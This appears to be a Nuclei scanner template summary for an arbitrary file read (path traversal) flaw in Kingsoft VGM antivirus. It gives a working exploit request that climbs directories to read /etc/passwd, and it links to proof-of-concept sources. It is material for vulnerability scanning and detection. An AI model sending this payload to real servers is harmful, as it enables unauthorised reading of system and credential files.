# Nuclei Template: Kingsoft VGM Antivirus - Arbitrary File Read
**Template ID:** kingsoft-vgm-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`kingsoft-vgm-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in Kingsoft Antivirus. An attacker can obtain any file on the server through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/downFile.php?filename=../../../../etc/passwd
```

## References
- https://mp.weixin.qq.com/s?__biz=MzkyMjE3MjEyNQ==&mid=2247486073&idx=1&sn=8e61e162262585bb8ce973b61df989b4&chksm=c1f925cbf68eacddfe441b8f1861e88068039712e467fb9bbe91eae31d439286c7147d197b07
- https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/kongsoft-vgm-antivirus-wall-rce.yaml
